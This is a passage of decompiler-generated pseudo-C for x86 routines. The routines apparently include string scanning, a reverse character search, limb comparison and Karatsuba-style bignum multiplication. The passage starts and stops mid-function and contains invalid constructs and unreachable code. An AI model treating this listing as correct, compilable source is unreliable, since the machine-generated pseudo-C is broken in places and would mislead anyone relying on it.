    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    do {
        cl = *edx;
        *(esp + ecx) = cl;
        if(*(esp + ecx) == 0) {
            goto L08057bb3;
        }
        cl = *(edx + 1);
        *(esp + ecx) = cl;
        if(*(esp + ecx) & 255) {
            goto L08057bb3;
        }
        cl = *(edx + 2);
        *(esp + ecx) = cl;
        if(*(esp + ecx) & 255) {
            goto L08057bb3;
        }
        cl = *(edx + 3);
        edx = edx + 4;
        *(esp + ecx) = cl;
    } while(cl & 255);
    eax = eax - 4;
L08057bb0:
    eax = eax + 4;
L08057bb3:
    cl = *eax;
    if(*(esp + ecx) != cl) {
        cl = *(eax + 1);
        if(*(esp + ecx) != cl) {
            cl = *(eax + 2);
            if(*(esp + ecx) != cl) {
                cl = *(eax + 3);
                if(*(esp + ecx) != cl) {
                    goto L08057bb0;
                }
                eax = eax + 1;
            }
            eax = eax + 1;
        }
        eax = eax + 1;
    }
    esp = esp + 256;
    if(cl == 0) {
        eax = 0;
    }
}



L08057BE8(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    eax = 0;
    esi = A8;
    ecx = Ac;
    ch = cl;
    edx = ecx;
    ecx = ecx << 16;
    cx = dx;
    if(!(esi & 3)) {
        dl = *esi;
        if(dl == cl) {
            eax = esi;
        }
        if(dl == 0) {
            goto L08057d9e;
        }
        esi = esi + 1;
        if(!(esi & 3)) {
            dl = *esi;
            if(dl == cl) {
                eax = esi;
            }
            if(dl == 0) {
                goto L08057d9e;
            }
            esi = esi + 1;
            if(!(esi & 3)) {
                dl = *esi;
                if(dl == cl) {
                    eax = esi;
                }
                if(dl == 0) {
                    goto L08057d9e;
                }
                esi = esi + 1;
            }
        }
    }
    while(1) {
        edx = *esi;
        if((edi = -16843009 + edx) || (edi = (edi ^ edx | -16843009) + 1)) {
            goto L08057d74;
        }
        edx = edx ^ ecx;
        if(edi = -16843009 + edx) {
            esi = esi - 4;
        } else {
            if(edi = (edi ^ edx | -16843009) + 1) {
                esi = esi - 4;
                goto L08057c69;
            }
            edx = *(esi + 4);
            if((edi = -16843009 + edx) || (edi = (edi ^ edx | -16843009) + 1)) {
                goto L08057d71;
            }
            edx = edx ^ ecx;
            if(!(edi = -16843009 + edx)) {
                goto L08057cf5;
            }
        }
        esi = esi - 4;
        goto L08057c56;
L08057cf5:
        if(edi = (edi ^ edx | -16843009) + 1) {
L08057c69:
            esi = esi - 4;
        } else {
            edx = *(esi + 8);
            if((edi = -16843009 + edx) || (edi = (edi ^ edx | -16843009) + 1)) {
                goto L08057d6e;
            }
            edx = edx ^ ecx;
            if(edi = -16843009 + edx) {
L08057c56:
                esi = esi - 4;
                goto L08057c59;
            }
            if(!(edi = (edi ^ edx | -16843009) + 1)) {
                goto L08057d31;
            }
        }
        esi = esi - 4;
        goto L08057c6f;
L08057d31:
        edx = *(esi + 12);
        if((edi = -16843009 + edx) || (edi = (edi ^ edx | -16843009) + 1)) {
            break;
        }
        edx = edx ^ ecx;
        if(edi = -16843009 + edx) {
L08057c59:
            if(edx & -16777216) {
                goto L08057c6f;
            }
            eax = esi + 15;
        } else {
            if(!(edi = (edi ^ edx | -16843009) + 1)) {
L08057c6f:
                eax = edx & 16711680 ? dh != 0 ? esi + 12 : esi + 13 : esi + 14;
            }
        }
        esi = esi + 16;
    }
    esi = esi + 4;
L08057d6e:
    esi = esi + 4;
L08057d71:
    esi = esi + 4;
L08057d74:
    if(dl == cl) {
        eax = esi;
    }
    if(dl != 0) {
        if(dh == cl) {
            eax = esi + 1;
        }
        if(dh != 0) {
            edx = edx >> 16;
            if(dl == cl) {
                eax = esi + 2;
            }
            if(dl != 0 && dh == cl) {
                eax = esi + 3;
            }
        }
    }
L08057d9e:
}



L08057DB0(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    eax = Ac;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    (save)0;
    do {
        cl = *eax;
        *(esp + ecx) = cl;
        if(*(esp + ecx) == 0) {
            break;
        }
        cl = *(eax + 1);
        *(esp + ecx) = cl;
        if(*(esp + ecx) == 0) {
            break;
        }
        cl = *(eax + 2);
        *(esp + ecx) = cl;
        if(*(esp + ecx) == 0) {
            break;
        }
        cl = *(eax + 3);
        eax = eax + 4;
        *(esp + ecx) = cl;
    } while(cl & 255);
    eax = -4;
    do {
        eax = eax + 4;
        if(*(esp + ecx) & *(A8 + eax)) {
            goto L08057e59;
        }
        if(*(esp + ecx) & *(A8 + eax + 1)) {
            goto L08057e58;
        }
        if(*(esp + ecx) & *(A8 + eax + 2)) {
            goto L08057e57;
        }
    } while(*(esp + ecx) & *(A8 + eax + 3));
    eax = eax + 1;
L08057e57:
    eax = eax + 1;
L08057e58:
    eax = eax + 1;
L08057e59:
    esp = esp + 256;
}











L08057F48(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    if(!(eax = A10 - 1)) {
        do {
            ecx = *(A8 + eax * 4);
            edx = *(Ac + eax * 4);
            if(ecx != edx) {
                goto L08057f70;
            }
        } while(eax = eax - 1);
    }
    eax = 0;
    goto L08057f7e;
L08057f70:
    eax = -1;
    if(ecx > edx) {
        eax = 1;
    }
L08057f7e:
}











L0805876C(A8, Ac, A10, A14, A18)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    edi = A18;
    Vfffffffc = A8 + A10 * 4 + edi * 4 - 4;
    if(edi <= 31) {
        if(edi == 0) {
            eax = 0;
            goto L08058dd1;
        }
        eax = *A14;
        if(eax <= 1) {
            != ? 0x8058830 : ;
            ebx = 0;
            if(A10 > 0) {
                if(eax = A10 & 3) {
                    goto L080587fc;
                }
                if(eax > 1) {
                    if(eax > 2) {
                        *A8 = *Ac;
                        ebx = 1;
                    }
                    eax = *(Ac + ebx * 4);
                    *(A8 + ebx * 4) = eax;
                    ebx = ebx + 1;
                }
                eax = *(Ac + ebx * 4);
                *(A8 + ebx * 4) = eax;
                ebx = ebx + 1;
                if(A10 != ebx) {
L080587fc:
                    do {
                        edi = Ac;
                        eax = *(edi + ebx * 4);
                        ecx = A8;
                        *(ecx + ebx * 4) = eax;
                        eax = ebx + 1;
                        *(ecx + eax * 4) = *(edi + eax * 4);
                        eax = ebx + 2;
                        *(ecx + eax * 4) = *(edi + eax * 4);
                        eax = ebx + 3;
                        *(ecx + eax * 4) = *(edi + eax * 4);
                        ebx = ebx + 4;
                    } while(A10 != ebx);
                    goto L0805889a;
                    eax = 0;
                    if(A10 > 0) {
                        if(edx = A10 & 3) {
                            goto L08058870;
                        }
                        if(edx > 1) {
                            if(edx > 2) {
                                *A8 = 0;
                                eax = 1;
                            }
                            *(A8 + eax * 4) = 0;
                            eax = eax + 1;
                        }
                        *(A8 + eax * 4) = 0;
                        eax = eax + 1;
                        if(A10 != eax) {
L08058870:
                            ecx = A8;
                            *(ecx + eax * 4) = 0;
                            *(ecx + eax * 4 + 4) = 0;
                            *(ecx + eax * 4 + 8) = 0;
                            *(ecx + eax * 4 + 12) = 0;
                            eax = eax + 4;
                            if(A10 != eax) {
                                goto L08058870;
                            }
                        }
                    }
                }
            }
L0805889a:
            edx = 0;
        } else {
            edx = L08058DE0(A8, Ac, A10, eax);
        }
        edi = A8;
        *(edi + A10 * 4) = edx;
        A8 = edi + 4;
        esi = 1;
        if(A18 > 1) {
            if(!(A18 & 1)) {
                eax = *(A14 + 4);
                if(eax <= 1) {
                    edx = 0;
                    if(eax != 1) {
                        goto L0805891b;
                    }
                    (save)A10;
                    (save)Ac;
                    ecx = A8;
                    (save)ecx;
                    (save)ecx;
                    eax = L08066380();
                } else {
                    eax = L08066420(A8, Ac, A10, eax);
                }
                edx = eax;
L0805891b:
                edi = A8;
                *(edi + A10 * 4) = edx;
                A8 = edi + 4;
                esi = esi + 1;
                if(A18 == esi) {
                    goto L080589d2;
                }
            }
            do {
                eax = *(A14 + esi * 4);
                if(eax > 1) {
                    eax = L08066420(A8, Ac, A10, eax);
                } else {
                    edx = 0;
                    if(eax != 1) {
                        goto L08058973;
                    }
                    (save)A10;
                    (save)Ac;
                    edi = A8;
                    (save)edi;
                    (save)edi;
                    eax = L08066380();
                }
                edx = eax;
L08058973:
                *(A8 + A10 * 4) = edx;
                ebx = A8 + 4;
                eax = *(A14 + esi * 4 + 4);
                if(eax > 1) {
                    eax = L08066420(ebx, Ac, A10, eax);
                } else {
                    edx = 0;
                    if(eax != 1) {
                        goto L080589bc;
                    }
                    (save)A10;
                    (save)Ac;
                    (save)ebx;
                    (save)ebx;
                    eax = L08066380();
                }
                edx = eax;
L080589bc:
                *(ebx + A10 * 4) = edx;
                A8 = A8 + 8;
                esi = esi + 2;
            } while(A18 != esi);
        }
L080589d2:
        eax = edx;
        goto L08058dd1;
L080589dc:
        L08058E20(A8, Ac, A14, A18);
    } else {
        edi = A18;
        esp = esp - edi * 8;
        Vfffffff8 = esp;
        if(edi <= 31) {
            goto L080589dc;
        }
        L08059048(A8, Ac, A14, edi, esp);
    }
    edi = A18;
    eax = edi * 4;
    A8 = A8 + eax;
    Ac = Ac + eax;
    A10 = A10 - edi;
    if(A10 >= edi) {
        esp = esp - edi * 8;
        Vfffffff4 = esp;
        do {
            if(A18 <= 31) {
                L08058E20(Vfffffff4, Ac, A14, A18);
            } else {
                L08059048(Vfffffff4, Ac, A14, A18, Vfffffff8);
            }
            edi = A8;
            Vffffffec = L08066380(edi, edi, Vfffffff4, A18);
            ecx = A18;
            eax = ecx * 4;
            esi = A8 + eax;
            ebx = Vfffffff4 + eax;
            Vfffffff0 = ecx;
            edx = *ebx;
            ebx = ebx + 4;
            eax = Vffffffec + edx;
            *esi = eax;
            esi = esi + 4;
            if(eax < edx) {
                Vfffffff0 = ecx;
                if(!(ecx = ecx - 1)) {
                    eax = ~ecx & 3;
                    if(ecx > 0) {
                        if(eax == 0) {
                            goto L08058b28;
                        }
                        if(eax < 3) {
                            if(eax < 2) {
                                edx = *ebx + 1;
                                ebx = ebx + 4;
                                *esi = edx;
                                esi = esi + 4;
                                if(edx != 0) {
                                    goto L08058b98;
                                }
                                Vfffffff0 = A18 + -2;
                            }
                            edx = *ebx + 1;
                            ebx = ebx + 4;
                            *esi = edx;
                            esi = esi + 4;
                            if(edx != 0) {
                                goto L08058b98;
                            }
                            Vfffffff0 = Vfffffff0 - 1;
                        }
                    }
                    edx = *ebx + 1;
                    ebx = ebx + 4;
                    *esi = edx;
                    esi = esi + 4;
                    if(edx != 0) {
                        goto L08058b98;
                    }
                    if(!(Vfffffff0 = Vfffffff0 - 1)) {
L08058b28:
                        do {
                            edx = *ebx + 1;
                            ebx = ebx + 4;
                            *esi = edx;
                            esi = esi + 4;
                            if(edx != 0) {
                                goto L08058b98;
                            }
                            Vfffffff0 = Vfffffff0 - 1;
                            edx = *ebx + 1;
                            ebx = ebx + 4;
                            *esi = edx;
                            esi = esi + 4;
                            if(edx != 0) {
                                goto L08058b98;
                            }
                            Vfffffff0 = Vfffffff0 - 1;
                            edx = *ebx + 1;
                            ebx = ebx + 4;
                            *esi = edx;
                            esi = esi + 4;
                            if(edx != 0) {
                                goto L08058b98;
                            }
                            Vfffffff0 = Vfffffff0 - 1;
                            edx = *ebx + 1;
                            ebx = ebx + 4;
                            *esi = edx;
                            esi = esi + 4;
                            if(edx != 0) {
                                goto L08058b98;
                            }
                        } while(Vfffffff0 = Vfffffff0 - 1);
                    }
                }
            } else {
L08058b98:
                if(esi != ebx) {
                    Vffffffec = 0;
                    ecx = Vfffffff0 - 1;
                    Vfffffff0 = ecx;
                    if(Vffffffec < ecx) {
                        if(!(eax = ecx & 3)) {
                            if(eax > 1) {
                                if(eax > 2) {
                                    *esi = *ebx;
                                    Vffffffec = Vffffffec + 1;
                                }
                                edi = Vffffffec;
                                *(esi + edi * 4) = *(ebx + edi * 4);
                                Vffffffec = edi + 1;
                            }
                            ecx = Vffffffec;
                            *(esi + ecx * 4) = *(ebx + ecx * 4);
                            ecx = ecx + 1;
L08058c0e:
                            Vffffffec = ecx;
                            if(ecx == Vfffffff0) {
                                goto L08058c18;
                            }
                        }
                        ecx = Vffffffec;
                        *(esi + ecx * 4) = *(ebx + ecx * 4);
                        eax = Vffffffec + 1;
                        *(esi + eax * 4) = *(ebx + eax * 4);
                        eax = Vffffffec + 2;
                        *(esi + eax * 4) = *(ebx + eax * 4);
                        eax = Vffffffec + 3;
                        *(esi + eax * 4) = *(ebx + eax * 4);
                        ecx = ecx + 4;
                        goto L08058c0e;
                    }
                }
            }
L08058c18:
            ecx = A18;
            eax = ecx * 4;
            A8 = A8 + eax;
            Ac = Ac + eax;
            A10 = A10 - ecx;
        } while(A10 >= ecx);
    }
    if(A10 != 0) {
        (save)A10;
        (save)Ac;
        (save)A18;
        (save)A14;
        edi = Vfffffff8;
        (save)edi;
        L0805876C();
        edi = A8;
        Vffffffec = L08066380(edi, edi, edi, A18);
        eax = A18 * 4;
        esi = A8 + eax;
        ebx = Vfffffff8 + eax;
        Vfffffff0 = A10;
        edx = *ebx;
        ebx = ebx + 4;
        eax = Vffffffec + edx;
        *esi = eax;
        esi = esi + 4;
        if(eax >= edx) {
            goto L08058d4c;
        }
        if(!(Vfffffff0 = Vfffffff0 - 1)) {
            eax = ~Vfffffff0 & 3;
            if(Vfffffff0 > 0) {
                if(eax == 0) {
                    goto L08058cfc;
                }
                if(eax < 3) {
                    if(eax < 2) {
                        edx = *ebx + 1;
                        ebx = ebx + 4;
                        *esi = edx;
                        esi = esi + 4;
                        if(edx != 0) {
                            goto L08058d4c;
                        }
                        Vfffffff0 = Vfffffff0 - 1;
                    }
                    edx = *ebx + 1;
                    ebx = ebx + 4;
                    *esi = edx;
                    esi = esi + 4;
                    if(edx != 0) {
                        goto L08058d4c;
                    }
                    Vfffffff0 = Vfffffff0 - 1;
                }
            }
            edx = *ebx + 1;
            ebx = ebx + 4;
            *esi = edx;
            esi = esi + 4;
            if(edx != 0) {
                goto L08058d4c;
            }
            if(!(Vfffffff0 = Vfffffff0 - 1)) {
L08058cfc:
                do {
                    edx = *ebx + 1;
                    ebx = ebx + 4;
                    *esi = edx;
                    esi = esi + 4;
                    if(edx != 0) {
                        goto L08058d4c;
                    }
                    Vfffffff0 = Vfffffff0 - 1;
                    edx = *ebx + 1;
                    ebx = ebx + 4;
                    *esi = edx;
                    esi = esi + 4;
                    if(edx != 0) {
                        goto L08058d4c;
                    }
                    Vfffffff0 = Vfffffff0 - 1;
                    edx = *ebx + 1;
                    ebx = ebx + 4;
                    *esi = edx;
                    esi = esi + 4;
                    if(edx != 0) {
                        goto L08058d4c;
                    }
                    Vfffffff0 = Vfffffff0 - 1;
                    edx = *ebx + 1;
                    ebx = ebx + 4;
                    *esi = edx;
                    esi = esi + 4;
                    if(edx != 0) {
                        goto L08058d4c;
                    }
                } while(Vfffffff0 = Vfffffff0 - 1);
                goto L08058dcc;
L08058d4c:
                if(esi != ebx) {
                    Vffffffec = 0;
                    ecx = Vfffffff0 - 1;
                    Vfffffff0 = ecx;
                    if(Vffffffec < ecx) {
                        if(!(eax = ecx & 3)) {
                            if(eax > 1) {
                                if(eax > 2) {
                                    *esi = *ebx;
                                    Vffffffec = Vffffffec + 1;
                                }
                                edi = Vffffffec;
                                *(esi + edi * 4) = *(ebx + edi * 4);
                                Vffffffec = edi + 1;
                            }
                            ecx = Vffffffec;
                            *(esi + ecx * 4) = *(ebx + ecx * 4);
                            ecx = ecx + 1;
                        } else {
L08058d94:
                            ecx = Vffffffec;
                            *(esi + ecx * 4) = *(ebx + ecx * 4);
                            edx = Vffffffec + 1;
                            *(esi + edx * 4) = *(ebx + edx * 4);
                            edx = Vffffffec + 2;
                            *(esi + edx * 4) = *(ebx + edx * 4);
                            edx = Vffffffec + 3;
                            *(esi + edx * 4) = *(ebx + edx * 4);
                            ecx = ecx + 4;
                        }
                        Vffffffec = ecx;
                        if(ecx != Vfffffff0) {
                            goto L08058d94;
                        }
                    }
                }
            }
        }
    }
L08058dcc:
    eax = *Vfffffffc;
L08058dd1:
    esp = ebp - 32;
}



L08058DE0(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    (save)ebp;
    edi = A8 + A10 * 4;
    esi = Ac + A10 * 4;
    ecx = ~A10;
    edx = 0;
    do {
        ebp = edx;
        eax = *(esi + ecx * 4);
        asm("mul ebx");
        eax = eax + ebp;
        asm("adc edx,+0x0");
        *(edi + ecx * 4) = eax;
    } while(ecx = ecx + 1);
    eax = edx;
    (restore)ebp;
}



L08058E20(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    ebx = A8;
    eax = *A10;
    if(eax <= 1) {
        != ? 0x8058eb0 : ;
        ecx = 0;
        if(A14 > 0) {
            if(eax = A14 & 3) {
                goto L08058e80;
            }
            if(eax > 1) {
                if(eax > 2) {
                    *ebx = *Ac;
                    ecx = 1;
                }
                *(ebx + ecx * 4) = *(Ac + ecx * 4);
                ecx = ecx + 1;
            }
            eax = *(Ac + ecx * 4);
            *(ebx + ecx * 4) = eax;
            ecx = ecx + 1;
            if(A14 != ecx) {
L08058e80:
                do {
                    esi = Ac;
                    *(ebx + ecx * 4) = *(esi + ecx * 4);
                    eax = ecx + 1;
                    *(ebx + eax * 4) = *(esi + eax * 4);
                    eax = ecx + 2;
                    *(ebx + eax * 4) = *(esi + eax * 4);
                    eax = ecx + 3;
                    *(ebx + eax * 4) = *(esi + eax * 4);
                    ecx = ecx + 4;
                } while(A14 != ecx);
                goto L08058f0f;
                eax = 0;
                if(A14 > 0) {
                    if(edx = A14 & 3) {
                        goto L08058ee8;
                    }
                    if(edx > 1) {
                        if(edx > 2) {
                            *ebx = 0;
                            eax = 1;
                        }
                        *(ebx + eax * 4) = 0;
                        eax = eax + 1;
                    }
                    *(ebx + eax * 4) = 0;
                    eax = eax + 1;
                    if(A14 != eax) {
L08058ee8:
                        *(ebx + eax * 4) = 0;
                        *(ebx + eax * 4 + 4) = 0;
                        *(ebx + eax * 4 + 8) = 0;
                        *(ebx + eax * 4 + 12) = 0;
                        eax = eax + 4;
                        if(A14 != eax) {
                            goto L08058ee8;
                        }
                    }
                }
            }
        }
L08058f0f:
        edx = 0;
    } else {
        eax = L08058DE0(ebx, Ac, A14, eax);
        edx = eax;
    }
    edi = A14;
    *(ebx + edi * 4) = edx;
    ebx = ebx + 4;
    Vfffffffc = 1;
    if(Vfffffffc < edi) {
        if(!(edi & 1)) {
            eax = *(A10 + 4);
            if(eax <= 1) {
                edx = 0;
                if(eax != 1) {
                    goto L08058f80;
                }
                (save)edi;
                (save)Ac;
                (save)ebx;
                (save)ebx;
                eax = L08066380();
            } else {
                eax = L08066420(ebx, Ac, A14, eax);
            }
            edx = eax;
L08058f80:
            esi = A14;
            *(ebx + esi * 4) = edx;
            ebx = ebx + 4;
            Vfffffffc = Vfffffffc + 1;
            if(Vfffffffc == esi) {
                goto L0805903c;
            }
        }
        do {
            eax = *(A10 + Vfffffffc * 4);
            if(eax > 1) {
                eax = L08066420(ebx, Ac, A14, eax);
            } else {
                edx = 0;
                if(eax != 1) {
                    goto L08058fd4;
                }
                (save)A14;
                (save)Ac;
                (save)ebx;
                (save)ebx;
                eax = L08066380();
            }
            edx = eax;
L08058fd4:
            *(ebx + A14 * 4) = edx;
            Vfffffff8 = ebx + 4;
            eax = *(A10 + Vfffffffc * 4 + 4);
            if(eax > 1) {
                eax = L08066420(Vfffffff8, Ac, A14, eax);
            } else {
                edx = 0;
                if(eax != 1) {
                    goto L08059023;
                }
                (save)A14;
                (save)Ac;
                edi = Vfffffff8;
                (save)edi;
                (save)edi;
                eax = L08066380();
            }
            edx = eax;
L08059023:
            edi = A14;
            *(Vfffffff8 + edi * 4) = edx;
            ebx = ebx + 8;
            Vfffffffc = Vfffffffc + 2;
        } while(Vfffffffc != edi);
    }
L0805903c:
    esp = ebp - 20;
}



L08059048(A8, Ac, A10, A14, A18)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    esi = A14;
    if(!(esi & 1)) {
        esi = esi - 1;
        Vffffffec = esi;
        if(esi > 31) {
            L08059048(A8, Ac, A10, esi, A18);
L08059082:
            edi = Vffffffec;
            (save) *(A10 + edi * 4);
            (save)edi;
            (save)Ac;
            esi = Vffffffec;
            edi = A8;
            ebx = edi + esi * 4;
            (save)ebx;
            *(edi + (Vffffffec + Vffffffec) * 4) = L08066420();
            (save) *(Ac + esi * 4);
            (save)A14;
            (save)A10;
            (save)ebx;
            eax = A14 + Vffffffec;
            *(A8 + eax * 4) = L08066420();
            goto L08059710;
        }
        L08058E20(A8, Ac, A10, Vffffffec);
        goto L08059082;
L080590f0:
        edi = Vfffffffc;
        eax = edi * 4;
        L08058E20(A8 + A14 * 4, eax + Ac, A10 + eax, edi);
    } else {
        esi = A14 >> 1;
        Vfffffffc = esi;
        if(esi <= 31) {
            goto L080590f0;
        }
        eax = esi * 4;
        L08059048(A8 + A14 * 4, eax + Ac, A10 + eax, esi, A18);
    }
    esi = Vfffffffc;
    edi = Ac;
    ebx = edi + esi * 4;
    if(L08057F48(ebx, edi, esi) >= 0) {
        (save)esi;
        (save)edi;
        (save)ebx;
        (save)A8;
        L0805A010();
        Vfffffff4 = 0;
    } else {
        edi = Vfffffffc;
        esi = Ac;
        L0805A010(A8, esi, esi + edi * 4, edi);
        Vfffffff4 = 1;
    }
    esi = Vfffffffc;
    esi = esi << 2;
    Vffffffec = esi;
    ebx = A10 + Vffffffec;
    if(L08057F48(ebx, A10, esi) >= 0) {
        (save)Vfffffffc;
        (save)A10;
        (save)ebx;
        (save)A8 + Vffffffec;
        L0805A010();
        Vfffffff4 = Vfffffff4 ^ 1;
        goto L08059216;
L080591dc:
        edi = Vfffffffc;
        esi = A8;
        L08058E20(A18, esi, esi + edi * 4, edi);
    } else {
        esi = Vfffffffc;
        eax = esi * 4;
        L0805A010(eax + A8, A10, A10 + eax, esi);
L08059216:
        if(Vfffffffc <= 31) {
            goto L080591dc;
        }
        esi = Vfffffffc;
        edi = A8;
        L08059048(A18, edi, edi + esi * 4, esi, A18 + A14 * 4);
    }
    if(Vfffffffc > 0) {
        edx = A14 * 4;
        esi = Vfffffffc;
        ecx = esi * 4;
        ebx = edx + ecx;
        if(eax = esi & 3) {
            goto L080592a4;
        }
        if(eax > 1) {
            if(eax > 2) {
                edi = A8;
                *(edi + ecx) = *(edi + edx);
                edx = edx + 4;
                ecx = ecx + 4;
            }
            esi = A8;
            *(esi + ecx) = *(esi + edx);
            edx = edx + 4;
            ecx = ecx + 4;
        }
        edi = A8;
        *(edi + ecx) = *(edi + edx);
        edx = edx + 4;
        ecx = ecx + 4;
        if(edx != ebx) {
L080592a4:
            do {
                esi = A8;
                *(esi + ecx) = *(esi + edx);
                *(esi + ecx + 4) = *(esi + edx + 4);
                *(esi + ecx + 8) = *(esi + edx + 8);
                *(esi + ecx + 12) = *(esi + edx + 12);
                edx = edx + 16;
                ecx = ecx + 16;
            } while(edx != ebx);
        }
    }
    edx = A8 + A14 * 4;
    ebx = Vfffffffc * 4;
    Vfffffff8 = L08066380(edx, edx, ebx + edx, Vfffffffc);
    if(Vfffffff4 != 0) {
        (save)A14;
        (save)A18;
        eax = A8 + ebx;
        (save)eax;
        (save)eax;
        Vfffffff8 = Vfffffff8 - L0805A010();
        goto L0805934f;
L08059318:
        L08058E20(A18, Ac, A10, Vfffffffc);
    } else {
        eax = A8 + Vfffffffc * 4;
        Vfffffff8 = Vfffffff8 + L08066380(eax, eax, A18, A14);
L0805934f:
        if(Vfffffffc <= 31) {
            goto L08059318;
        }
        L08059048(A18, Ac, A10, Vfffffffc, A18 + A14 * 4);
    }
    ebx = A8 + Vfffffffc * 4;
    Vfffffff8 = Vfffffff8 + L08066380(ebx, ebx, A18, A14);
    if(Vfffffff8 != 0) {
        ebx = ebx + A14 * 4;
        esi = Vfffffffc;
        Vfffffff0 = esi;
        edx = *ebx;
        Vffffffec = ebx + 4;
        eax = Vfffffff8 + edx;
        *ebx = eax;
        ebx = Vffffffec;
        if(eax >= edx) {
            goto L0805949c;
        }
        Vfffffff0 = esi;
        if(!(esi = esi - 1)) {
            eax = ~esi & 3;
            if(esi > 0) {
                if(eax == 0) {
                    goto L08059440;
                }
                if(eax < 3) {
                    if(eax < 2) {
                        edx = *ebx + 1;
                        Vffffffec = ebx + 4;
                        *ebx = edx;
                        ebx = Vffffffec;
                        if(edx != 0) {
                            goto L0805949c;
                        }
                        Vfffffff0 = Vfffffffc + -2;
                    }
                    esi = Vffffffec;
                    edx = *esi + 1;
                    Vffffffec = esi + 4;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L0805949c;
                    }
                    Vfffffff0 = Vfffffff0 - 1;
                }
            }
            edi = Vffffffec;
            edx = *edi + 1;
            Vffffffec = edi + 4;
            *ebx = edx;
            ebx = ebx + 4;
            if(edx != 0) {
                goto L0805949c;
            }
            if(!(Vfffffff0 = Vfffffff0 - 1)) {
L08059440:
                do {
                    esi = Vffffffec;
                    edx = *esi + 1;
                    esi = esi + 4;
                    Vffffffec = esi;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L0805949c;
                    }
                    Vfffffff0 = Vfffffff0 - 1;
                    edx = *esi + 1;
                    esi = esi + 4;
                    Vffffffec = esi;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L0805949c;
                    }
                    Vfffffff0 = Vfffffff0 - 1;
                    edx = *esi + 1;
                    esi = esi + 4;
                    Vffffffec = esi;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L0805949c;
                    }
                    Vfffffff0 = Vfffffff0 - 1;
                    edx = *esi + 1;
                    Vffffffec = esi + 4;
                    *ebx = edx;
                    ebx = ebx + 4;
                    if(edx != 0) {
                        goto L0805949c;
                    }
                } while(Vfffffff0 = Vfffffff0 - 1);
                goto L0805950c;
L0805949c:
                if(Vffffffec != ebx) {
                    ecx = 0;
                    edi = Vfffffff0 - 1;
                    Vfffffff0 = edi;
                    if(0 < edi) {
                        if(eax = edi & 3) {
                            goto L080594e0;
                        }
                        if(eax > 1) {
                            if(eax > 2) {
                                *ebx = *Vffffffec;
                                ecx = 1;
                            }
                            *(ebx + ecx * 4) = *(Vffffffec + ecx * 4);
                            ecx = ecx + 1;
                        }
                        *(ebx + ecx * 4) = *(Vffffffec + ecx * 4);
                        ecx = ecx + 1;
                        if(Vfffffff0 != ecx) {
L080594e0:
                            do {
                                edi = Vffffffec;
                                *(ebx + ecx * 4) = *(edi + ecx * 4);
                                edx = ecx + 1;
                                *(ebx + edx * 4) = *(edi + edx * 4);
                                edx = ecx + 2;
                                *(ebx + edx * 4) = *(edi + edx * 4);
                                edx = ecx + 3;
                                *(ebx + edx * 4) = *(edi + edx * 4);
                                ecx = ecx + 4;
                            } while(Vfffffff0 != ecx);
                        }
                    }
                }
            }
        }
    }
L0805950c:
    ecx = 0;
    if(Vfffffffc > 0) {
        if(eax = Vfffffffc & 3) {
            goto L08059550;
        }
        if(eax > 1) {
            if(eax > 2) {
                *A8 = *A18;
                ecx = 1;
            }
